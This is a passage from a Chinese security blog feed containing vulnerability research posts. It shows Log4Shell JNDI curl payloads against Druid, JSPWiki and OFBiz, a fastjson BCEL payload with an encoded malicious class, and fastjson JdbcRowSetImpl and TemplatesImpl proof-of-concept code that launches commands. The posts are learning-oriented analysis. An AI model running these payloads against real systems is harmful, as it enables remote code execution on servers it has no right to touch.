title="Druid"></a>Druid</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -vv -X DELETE &apos;http://localhost:8888/druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2flocalhost:1270%2fabc%7d&apos;</span><br></pre></td></tr></table></figure><h3 id="JSPWiki"><a href="#JSPWiki" class="headerlink" title="JSPWiki"></a>JSPWiki</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -vv http://localhost:8080/JSPWiki/wiki/$%7Bjndi:ldap:$%7B::-/%7D/10.0.0.6:1270/abc%7D/</span><br></pre></td></tr></table></figure><h3 id="OFBiz"><a href="#OFBiz" class="headerlink" title="OFBiz"></a>OFBiz</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --insecure -vv -H &quot;Cookie: OFBiz.Visitor=\$&#123;jndi:ldap://localhost:1270/abc&#125;&quot; https://localhost:8443/webtools/control/main</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>在成文那天早上，@su18师傅在群里发布log4j详细分析文章，其中还有log4j 1.x的JNDI利用思路，虽然实现条件挺苛刻，但不得不感叹师傅们真的细。</p><p>这篇文章写下来就花了一天半的时间，比以往快了不少，转了安全研究岗还是有挺多时间学东西的，虽然也有怕leader催的缘故。😂</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html" target="_blank" rel="noopener">https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html</a></p><p><a href="https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg</a></p><p><a href="https://lorexxar.cn/2021/12/10/log4j2-jndi/#2-15-0-rc1-%E7%9A%84%E4%BF%AE%E5%A4%8D" target="_blank" rel="noopener">https://lorexxar.cn/2021/12/10/log4j2-jndi/#2-15-0-rc1-%E7%9A%84%E4%BF%AE%E5%A4%8D</a></p><p><a href="https://xz.aliyun.com/t/10649#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/10649#toc-2</a></p><p><a href="https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis" target="_blank" rel="noopener">https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;2021 年 12 月 10 日，Apache发布了其 Log4j 框架的 2.15.0 版，其中包括对 CVE-2021-44228 的修复，这是一个影响 Apache Log4j 2.14.1 及更早版本的关键 (CVSSv3 10) 远程代码执行 (RCE) 漏洞。该漏洞存在于 Log4j 处理器处理特制日志消息的方式中。不可信的字符串（例如，来自输入文本字段的字符串，例如 Web 应用程序搜索框）包含的内容&lt;code&gt;${jndi:ldap://example.com/a}&lt;/code&gt;，如果启用了消息查找替换，将触发远程类加载、消息查找和相关内容的执行。成功利用 CVE-2021-44228 可以让未经身份验证的远程攻击者完全控制易受攻击的目标系统。&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
    
    
    <category term="log4j" scheme="http://127.0.0.1/tags/log4j/"/>
    
    <category term="struts2" scheme="http://127.0.0.1/tags/struts2/"/>
    
    <category term="JNDI" scheme="http://127.0.0.1/tags/JNDI/"/>
    
  </entry>
  
  <entry>
    <title>fastjson不出网利用简析</title>
    <link href="http://127.0.0.1/2021/11/25/fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E7%AE%80%E6%9E%90/"/>
    <id>http://127.0.0.1/2021/11/25/fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E7%AE%80%E6%9E%90/</id>
    <published>2021-11-25T03:51:53.000Z</published>
    <updated>2021-11-25T03:53:27.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>又来炒冷饭啦，做项目终于遇到个fastjson反序列化，但又不想贡献自己的VPS出来搭个JNDI，于是网上找个POC试了下。Duang的一下竟然成功了，执行命令还有回显，有点意思啊，于是开始炒冷饭了。</p><a id="more"></a><h2 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h2><p>既然是不出网，许多POC中利用JNDI远程加载外部类的方法就无法使用了，不出网的利用需要无需加载类或可通过类属性加载。另一个前提就是获取命令的执行结果，可以将结果写入到web目录，访问该文件获取结果，但更优雅的方式是获取response，将结果从响应信息中输出。</p><h2 id="远程加载类"><a href="#远程加载类" class="headerlink" title="远程加载类"></a>远程加载类</h2><p>目前公开且较为通用的不出网利用链有两条。</p><blockquote><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p><p><code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code></p></blockquote><p><code>TemplatesImpl</code>上一篇文章已经分析过了，反序序列化方法中feature参数需要设置为允许给非公有属性赋值，与<code>BasicDataSource</code>相比就有些鸡肋了。<code>BasicDataSource</code>只需要有<code>dbcp</code>或<code>tomcat-dbcp</code>的依赖即可，dbcp即数据库连接池，在java中用于管理数据库连接，还是挺常见的。</p><p><img src="/2021/11/25/fastjson不出网利用简析/屏幕截图 2021-11-17 131613.png" alt></p><p>以下是一个加载恶意类，而恶意类静态代码中有写了<code>Runtime</code>弹计算器的POC，老样子在<code>exec</code>方法处下断点，发现调用栈还是比较钱的，可以从开头开始分析。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> com.p1ay2win.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BCEL</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;</span><br><span class="line">        String payload2 = <span class="hljs-string">"&#123;\n"</span> +</span><br><span class="line">                <span class="hljs-string">"    &#123;\n"</span> +</span><br><span class="line">                <span class="hljs-string">"        \"x\":&#123;\n"</span> +</span><br><span class="line">                <span class="hljs-string">"                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n"</span> +</span><br><span class="line">                <span class="hljs-string">"                \"driverClassLoader\": &#123;\n"</span> +</span><br><span class="line">                <span class="hljs-string">"                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n"</span> +</span><br><span class="line">                <span class="hljs-string">"                &#125;,\n"</span> +</span><br><span class="line">                <span class="hljs-string">"                \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuQ$cbN$db$40$U$3d$938$b1c$9c$e6A$D$94$a6o$k$81E$zPw$m6$V$95$aa$baM$d5$m$ba$9eL$a7a$82cG$f6$84$a6_$c4$3a$hZ$b1$e8$H$f0Q$88$3b$sM$pAG$f2$7d$ce9$f7$dc$f1$d5$f5$e5$l$Ao$b0$e1$c2$c1$b2$8b$V$3cr$b0j$fcc$hM$X$F$3c$b1$f1$d4$c63$86$e2$be$8a$94$3e$60$c8$b7$b6$8e$Z$ac$b7$f17$c9P$JT$q$3f$8d$G$5d$99$i$f1nH$95z$Q$L$k$k$f3D$99$7cZ$b4$f4$89J$Z$9a$81$88$H$fep$87$ff$dc$fd$a1$o$ff$3bOu$3f$8d$p$ff$f0L$85$7b$M$ce$be$I$a7C$Y$81$gA$9f$9fq_$c5$fe$fb$f6$e1X$c8$a1VqD$d7$ca$j$cd$c5$e9G$3e$cc$c8I$t$83$db$89G$89$90$ef$94$ZV2t$af$N$d6C$J$ae$8d$e7$k$5e$e0$r$a9$ma$c2$c3$x$ac1$y$de$c3$eda$j$$$c3$ea$ffE2T3$5c$c8$a3$9e$df$ee$f6$a5$d0$M$b5$7f$a5$_$a3H$ab$Bip$7bR$cf$92Fk$x$b8s$87$W$b1$e4X$K$86$cd$d6$5c$b7$a3$T$V$f5$f6$e6$B$9f$93X$c84$r$40eHM$9d$ad$7f$94p$ni$z$9b$7e$9c990$b3$y$d9$F$ca$7c$f2$8c$7ca$fb$X$d8$qk$7bd$8b$b7E$94$c9z$d3$f8$B$w$e4$jTg$60$9e$91$B$f5$df$c8$d5$f3$X$b0$be$9e$c3$f9$b0$7d$81$e2$q$ab$97$I$5b$40$3ec$5c$a2$c8$a0K$844$af$5d$s$96$gE$7f$t$94aQ$5e$a7l$91$3e$h$b9$c0$c6C$8b$g$8dL$d4$d2$N_$9f$94$o$82$C$A$A\"\n"</span> +</span><br><span class="line">                <span class="hljs-string">"        &#125;\n"</span> +</span><br><span class="line">                <span class="hljs-string">"    &#125;: \"x\"\n"</span> +</span><br><span class="line">                <span class="hljs-string">"&#125;"</span>;</span><br><span class="line">        JSON.parse(payload2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/25/fastjson不出网利用简析/屏幕截图 2021-11-17 135020.png" alt></p><p>直接跟进到<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject</code>，当反序列化的对象为<code>JSONObject</code>时，会调用键的<code>toString</code>方法。此时的键是键为<code>x</code>，值为<code>BasicDataSource</code>对象的<code>JSONObject</code>对象。</p><p><img src="/2021/11/25/fastjson不出网利用简析/屏幕截图 2021-11-22 233550.png" alt></p><p>跟进<code>com.alibaba.fastjson.JSON#toString</code>，返回的是它的<code>toJSONString</code>方法的值。接着又套娃调用了三次<code>write</code>方法，来到了<code>com.alibaba.fastjson.serializer.ASMSerializer_1_BasicDataSource#write</code>。IDEA并么有识别出<code>ASMSerializer_1_BasicDataSource</code>的源码，也就是<code>com.alibaba.fastjson.serializer</code>下并没有这个类。</p><p>回到<code>com.alibaba.fastjson.serializer.MapSerializer#write</code>调用<code>serializer</code>属性的<code>getObjectWriter</code>方法处跟进，发现最终调用的是<code>com.alibaba.fastjson.serializer.SerializeConfig#createASMSerializer</code>，<code>ASMSerializerFactory</code>工厂类生成了<code>BasicDataSource</code>的<code>ASMSerializer</code>专属子类<code>ASMSerializer_1_BasicDataSource</code>。</p><p><img src="/2021/11/25/fastjson不出网利用简析/屏幕截图 2021-11-23 010928.png" alt></p><p>关于<code>ASMSerializer_1_BasicDataSource</code>这个类，这里就涉及了一个知识点：ASM。</p><blockquote><p>ASM是一个通用的Java字节码操作和分析框架，它可以用来修改现有的类或直接以二进制形式动态生成类。ASM提供了一些常见的字节码转换和分析算法，从中可以构建定制的复杂转换和代码分析工具。ASM提供了与其他Java字节码框架类似的功能，但侧重于性能。因为它的设计和实现都尽可能小和快，所以它非常适合在动态系统中使用（当然也可以以静态方式使用，例如在编译器中）。</p></blockquote><p>生成这个类的<code>write</code>方法中会调用<code>BasicDataSource</code>类的<code>getter</code>方法，其中就有最开始调用栈中的<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource#getConnection</code>方法。接着跟进到<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createConnectionFactory</code>，当<code>driverClassLoader</code>非空时，会调用<code>loader</code>可控的<code>forName</code>重载方法。</p><p><img src="/2021/11/25/fastjson不出网利用简析/屏幕截图 2021-11-23 232731.png" alt></p><p>此时的<code>loader</code>是BCEL的<code>ClassLoader</code>，这是一个神奇的<code>ClassLoader</code>。当反射的类名是<code>$$BCEL$$</code>开头时，会将类名剩余部分解码作为输入流，解析并返回一个Class实例，那么恶意类的静态代码中的恶意代码就会被执行。</p><p><img src="/2021/11/25/fastjson不出网利用简析/屏幕截图 2021-11-24 120440.png" alt></p><h2 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h2><p>在网上找到了两串BCEL回显的POC，使用BCEL自带的<code>Utility</code>工具类解码，保存为<code>.class</code>文件就可以用IDEA反编译直接看。解码Demo如下：</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BCELDecode</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String encode = <span class="hljs-string">"$l$8b$I$A$A$A$A$A$A$A..."</span>;</span><br><span class="line">        <span class="hljs-keyword">byte</span>[] decode = Utility.decode(encode,<span class="hljs-keyword">true</span>);</span><br><span class="line">        FileOutputStream fileOutputStream = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">"DecodeClass.class"</span>);</span><br><span class="line">        fileOutputStream.write(decode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先来看看Spring获取request和response的办法，是一种较为通用的方法。Spring在请求预处理调用<code>processRequest</code>方法的时候，会将request和response放进<code>RequestContextHolder</code>的线程局部变量里，所以当前线程的任何地方都可以取用到request和response。</p><p><img src="/2021/11/25/fastjson不出网利用简析/屏幕截图 2021-11-25 103842.png" alt></p><p>在看看tomcat的回显，代码稍长，利用的是c0ny1师傅提出的一种方法，深度优先搜索遍历当前线程的所有属性找到request和response，是tomcat上一种较为通用的回显方法。详细的分析可以在c0ny1的文章：<a href="https://paper.seebug.org/1181/" target="_blank" rel="noopener">半自动化挖掘 request 实现多种中间件回显</a>中看到，这里就不展开说。</p><p><img src="/2021/11/25/fastjson不出网利用简析/屏幕截图 2021-11-25 104728.png" alt></p><p>以上两种方法都用<code>Thread.currentThread().getContextClassLoader()</code>获取上下文类加载器来加载类，个人的理解呢，是因为Java的双亲委派机制。直接使用<code>Class.forName</code>加载的话，在反序列化或加载内存马的点的类加载器是spring和tomcat类的类加载器的parent类加载器，或是与他平行的分支，直接用<code>Class.forName</code>就无法加载到spring和tomcat的类。</p><p><img src="/2021/11/25/fastjson不出网利用简析/169a465deb2c1d96_tplv-t2oaga2asx-watermark.jpg" alt></p><p>而Spring和tomcat又因为不同Web应用不同版依赖本共存、动态加载jsp等一些原因打破了双亲委派机制，会将当前线程的上下文类加载器设置为他们各自的Web应用类加载器，刚好就能通过上下文类加载器加载到想要的Spring和tomcat类。</p><p>以上是个人对上下文类加载器在回显中作用的个人理解，若其中有误，欢用各位师傅斧正。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>以上涉及的知识点也就是BCEL的Classloader特性、双亲委派机制和打破双亲委派的方法，好像也没什么，但这段时间的心路历程让我想起来王家卫东邪西毒里的一句</p><blockquote><p>每个人都会经历这个阶段：<br>看见一座山，就想知道山后面是什么。<br>我很想告诉他，<br>可能翻过去山后面，你会发觉没有什么特别。<br>回头看，会觉得这一边更好。<br>但我知道他不会听，<br>以他的性格，自己不试过，又怎么会甘心？</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html" target="_blank" rel="noopener">https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html</a></p><p><a href="https://github.com/depycode/fastjson-local-echo" target="_blank" rel="noopener">https://github.com/depycode/fastjson-local-echo</a></p><p><a href="https://segmentfault.com/a/1190000040160637" target="_blank" rel="noopener">https://segmentfault.com/a/1190000040160637</a></p><p><a href="https://segmentfault.com/a/1190000040188046" target="_blank" rel="noopener">https://segmentfault.com/a/1190000040188046</a></p><p><a href="https://paper.seebug.org/1181/" target="_blank" rel="noopener">https://paper.seebug.org/1181/</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;又来炒冷饭啦，做项目终于遇到个fastjson反序列化，但又不想贡献自己的VPS出来搭个JNDI，于是网上找个POC试了下。Duang的一下竟然成功了，执行命令还有回显，有点意思啊，于是开始炒冷饭了。&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
    
    
    <category term="内存马" scheme="http://127.0.0.1/tags/内存马/"/>
    
    <category term="tomcat" scheme="http://127.0.0.1/tags/tomcat/"/>
    
    <category term="Spring" scheme="http://127.0.0.1/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>fastjson反序列化漏洞学习</title>
    <link href="http://127.0.0.1/2021/10/31/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>http://127.0.0.1/2021/10/31/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-10-31T06:20:53.000Z</published>
    <updated>2021-10-31T06:20:54.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>fastjson反序列化，JAVA安全绕不过的坎。</p><a id="more"></a><h2 id="反序列化原理"><a href="#反序列化原理" class="headerlink" title="反序列化原理"></a>反序列化原理</h2><p>一般情况下，fastjson反序列化的结果是一个<code>JSONObject</code>的对象，但在序列化时设置<code>SerializerFeature</code>为<code>WriteClassName</code>，序列化的字符串就会多一个<code>@type</code>的键值对，在反序列化时就会按照<code>@type</code>的值，返回相应的对象。</p><p>实验代码和运行结果如下，可以看到当反序列化的方法为<code>parse</code>和<code>parseObject</code>且传入参数为json字符串和Class实例时，会自动调用给定类的构造方法和setter方法；当放序列化方法为<code>parseObject</code>且只传入json字符串时，会调用给定类的构造方法、setter方法和全部的getter方法。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;</span><br><span class="line">    TestClass testClass = <span class="hljs-keyword">new</span> TestClass();</span><br><span class="line">    String json = JSON.toJSONString(testClass, SerializerFeature.WriteClassName);</span><br><span class="line">    System.out.println(json);</span><br><span class="line">    System.out.println(<span class="hljs-string">"---------------------------"</span>);</span><br><span class="line">    JSON.parse(json);</span><br><span class="line">    System.out.println(<span class="hljs-string">"---------------------------"</span>);</span><br><span class="line">    JSON.parseObject(json);</span><br><span class="line">    System.out.println(<span class="hljs-string">"---------------------------"</span>);</span><br><span class="line">    JSON.parseObject(json,TestClass.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/fastjson反序列化漏洞学习/屏幕截图 2021-10-27 153646.png" alt></p><p>综上，构造payload的入口类的构造方法、setter方法或getter方法需要具有实现想要功能的代码，或可通过这些方法跳转到中间衔接类或目的实现类。</p><h2 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h2><p>fastjson在1.2.24下有两个通用的payload：<code>JdbcRowSetImpl</code>和<code>TemplatesImpl</code>。</p><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>从以下payload可以看出是通过JNDI注入实现命令执行的，搭好RMI服务后，在<code>Runtime</code>的<code>exec</code>方法下个断点。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:8888/Calc&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>调用栈很简单，在<code>setAutoCommit</code>方法调用<code>connnet</code>方法，而<code>connnet</code>方法又使用我们设置的JNDI字符串调用<code>lookup</code>方法，加载恶意的工厂类导致命令执行。当然也因为是JNDI的利用方式，在一些低版本JDK环境下才能利用成功。</p><p><img src="/2021/10/31/fastjson反序列化漏洞学习/屏幕截图 2021-10-28 134343.png" alt></p><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>TemplatesImpl的POC构造比JdbcRowSetImpl复杂些，而且对反序列化的<code>SerializerFeature</code>参数有要求，使用<code>parseObject</code>时需要<code>JSON.parseObject(json, Object.class, Feature.SupportNonPublicField)</code>，<code>parse</code>方法时需要<code>JSON.parse(json,Feature.SupportNonPublicField)</code>，但好处就是无需出网加载恶意类。</p><p>下面是利用代码，同样在<code>exec</code>方法下断点继续调试。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Templates</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        CtClass ctClass = classPool.get(evil.class.getName());</span><br><span class="line">        String code = <span class="hljs-string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertBefore(code);</span><br><span class="line">        String randomClassName = <span class="hljs-string">"p1ay2win"</span> + System.nanoTime();</span><br><span class="line">        ctClass.setName(randomClassName);</span><br><span class="line">        ctClass.setSuperclass((classPool.get(AbstractTranslet.class.getName())));</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">byte</span>[] evilCode = ctClass.toBytecode();</span><br><span class="line">        String encode = Base64.encodeBase64String(evilCode);</span><br><span class="line">        String json = <span class="hljs-string">"&#123;\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\": [\""</span> + encode + <span class="hljs-string">"\"], \"_name\": \"p1ya2win\", \"_tfactory\": &#123; &#125;, \"_outputProperties\":&#123; &#125;&#125;"</span>;</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        JSON.parseObject(json, Object.class, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用栈显示设置<code>outputProperties</code>而调用它的setter方法，接着再陆续调用<code>newTransformer</code>方法和<code>getTransletInstance</code>方法。主要的代码在<code>getTransletInstance</code>方法中，实例化<code>_class</code>数组里相应的Class实例。而<code>_class</code>数组我们是没有在json中设置的，它的赋值是在上面的<code>defineTransletClasses</code>方法。</p><p><img src="/2021/10/31/fastjson反序列化漏洞学习/屏幕截图 2021-10-29 174008.png" alt></p><p>跟进<code>defineTransletClasses</code>方法，会通过<code>TransletClassLoader</code>的<code>defineClass</code>将我传入的<code>_bytecodes</code>字节转换为Class实例，但在这之前和之后会调用<code>_tfactory</code>的方法和判断<code>_transletIndex</code>是否小于0。这时可以利用fastjson自动实例化传空值的属性的类型的特性，将<code>_tfactory</code>初始化，然后<code>_transletIndex</code>的问题，可以令恶意类的父类为<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>在if里给<code>_transletIndex</code>赋值。还有个<code>_name</code>属性，在<code>getTransletInstance</code>方法里判断为空则会返回空，不会进入到实例化的方法里，在这里给<code>_name</code>属性赋任意字符串值即可。</p><p><img src="/2021/10/31/fastjson反序列化漏洞学习/屏幕截图 2021-10-31 075859.png" alt></p><p>还有个问题就是，payload里<code>_bytecodes</code>的值为数组套个base64的字符串，但在TemplatesImpl里<code>_bytecodes</code>的类型是二维数组字节。通过别的文章得知fastjson是使用自己的<code>IOUtils</code>工具类实现base64解码的，在相应的方法下断点。<code>ObjectArrayCodec</code>的<code>deserialze</code>方法调用<code>JSONScanner</code>的<code>bytesVAlues</code>方法进行base64解码。</p><p><img src="/2021/10/31/fastjson反序列化漏洞学习/屏幕截图 2021-10-31 131928.png" alt></p><p>再往上几层跟进到<code>DefaultFieldDeserializer</code>的<code>parseField</code>方法，根据不同的<code>fieldValueDeserilizer</code>值通过<code>deserialze</code>反序列化获取属性的值。而<code>fieldValueDeserilizer</code>的值又是从<code>ParserConfig</code>的<code>getDeserializer</code>方法获取，在这个方法里，数组类型的属性会返回<code>ObjectArrayCodec</code>实例的<code>derializer</code>。<code>ObjectArrayCodec</code>会像调用栈所示那样，对数组类型属性的base64值解码还原。</p><p><img src="/2021/10/31/fastjson反序列化漏洞学习/屏幕截图 2021-10-31 134002.png" alt></p><p>属性的问题明了了，回到<code>TemplatesImpl</code>的<code>getTransletInstance</code>方法，实例化<code>_class</code>Class实例数组里的类，执行类恶意类里的静态方法，至此利用结束。</p><p><img src="/2021/10/31/fastjson反序列化漏洞学习/屏幕截图 2021-10-31 135159.png" alt></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>平庸这东西犹如白衬衣上的污痕，一旦染上便永远洗不掉，无可挽回</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://y4er.com/post/fastjson-learn/" target="_blank" rel="noopener">https://y4er.com/post/fastjson-learn/</a></p><p><a href="https://www.cnblogs.com/chengez/p/14789477.html" target="_blank" rel="noopener">https://www.cnblogs.com/chengez/p/14789477.html</a></p><p><a href="https://www.cnblogs.com/0x7e/p/14400933.html" target="_blank" rel="noopener">https://www.cnblogs.com/0x7e/p/14400933.html</a></p><p><a href="https://paper.seebug.org/1242/#commonscollections-2" target="_blank" rel="noopener">https://paper.seebug.org/1242/#commonscollections-2</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;fastjson反序列化，JAVA安全绕不过的坎。&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
    
    
    <category term="反序列化" scheme="http://127.0.0.1/tags/反序列化/"/>
    
  </entry>
  
  <entry>
    <title>Confluence模板注入（CVE-2020-4027）复现</title>
    <link href="http://127.0.0.1/2021/10/20/Confluence%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2020-4027%EF%BC%89%E5%A4%8D%E7%8E%B0/"/>
    <id>http://127.0.0.1/2021/10/20/Confluence%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2020-4027%EF%BC%89%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-10-20T06:37:53.000Z</published>
    <updated>2021-10-20T07:58:45.000Z</updated>
    
